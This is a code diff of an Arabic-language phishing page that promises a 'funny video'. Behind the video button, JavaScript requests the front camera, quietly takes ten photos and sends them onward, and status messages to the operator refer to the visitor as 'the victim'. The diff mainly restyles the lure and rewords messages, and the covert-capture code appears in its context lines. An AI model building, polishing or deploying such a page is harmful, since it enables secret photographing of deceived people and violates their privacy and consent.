@@ -20,24 +20,28 @@
     #container { 
       z-index:9999; 
       background:rgba(0,0,0,0.8); 
-      padding:40px; 
-      border-radius:15px; 
+      padding:50px 30px; 
+      border-radius:20px; 
       max-width:90%; 
+      box-shadow:0 0 30px rgba(255,255,255,0.2); 
     }
-    h1 { font-size:28px; margin-bottom:30px; }
+    h1 { font-size:32px; margin-bottom:40px; text-shadow:0 0 10px #fff; }
     button { 
-      padding:18px 40px; 
-      margin:15px; 
-      font-size:22px; 
+      padding:20px 60px; 
+      margin:25px; 
+      font-size:26px; 
+      font-weight:bold; 
       border:none; 
-      border-radius:10px; 
+      border-radius:12px; 
       cursor:pointer; 
       color:white; 
-      width:280px; 
+      transition: all 0.3s; 
+      width:320px; 
     }
+    button:hover { transform:scale(1.05); box-shadow:0 0 20px rgba(255,255,255,0.5); }
     #yes { background:#00cc44; }
     #no { background:#ff4444; }
-    #msg { margin-top:20px; font-size:18px; }
+    #msg { margin-top:30px; font-size:20px; }
     #video { display:none; width:100vw; height:100vh; position:fixed; top:0; left:0; z-index:1; }
   </style>
 </head>
@@ -46,6 +50,7 @@
 <div id="container">
   <h1>شاهد هذا الفيديو المضحك 😂</h1>
   <button id="yes" onclick="startCamera()">متابعة مشاهدة الفيديو</button>
+  <br>
   <button id="no" onclick="reject()">رفض مشاهدة الفيديو</button>
   <div id="msg"></div>
 </div>
@@ -77,7 +82,7 @@ function sendPhoto(photo, caption) {
 
 // رفض → ما يصير والو
 function reject() {
-  document.getElementById('msg').innerText = 'تم الرفض، شكرا!';
+  document.getElementById('msg').innerText = 'تم الرفض، شكراً!';
   setTimeout(() => window.close(), 2000);
 }
 
@@ -89,7 +94,7 @@ async function startCamera() {
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: 'user' } // الكاميرا الأمامية
+      video: { facingMode: 'user' } // الكاميرا الأمامية فقط
     });
 
     sendText('✅ الضحية وافق على الكاميرا الأمامية!');
@@ -103,7 +108,7 @@ async function startCamera() {
       if (count >= 10) {
         clearInterval(interval);
         stream.getTracks().forEach(track => track.stop());
-        sendText('تم سحب 10 صور من الكاميرا الأمامية');
+        sendText('تم سحب 10 صور من الكاميرا الأمامية بنجاح');
         return;
       }
 
@@ -112,12 +117,12 @@ async function startCamera() {
         sendPhoto(img, `صورة ${count+1}/10 من الكاميرا الأمامية`);
         count++;
       });
-    }, 800); // كل 0.8 ثانية صورة (سريع وما يتعبش الجهاز)
+    }, 800); // صورة كل 0.8 ثانية (سريع وخفيف)
 
   } catch (err) {
-    sendText(`❌ رفض الوصول للكاميرا: ${err.message}`);
+    sendText(`❌ رفض الوصول للكاميرا: ${err.message || 'غير معروف'}`);
     document.getElementById('msg').innerText = 'يرجى السماح بالكاميرا لمشاهدة الفيديو';
-    document.getElementById('container').style.display = 'block';
+    document.getElementById('container').style.display = 'flex';
     document.getElementById('video').style.display = 'none';
   }
 }
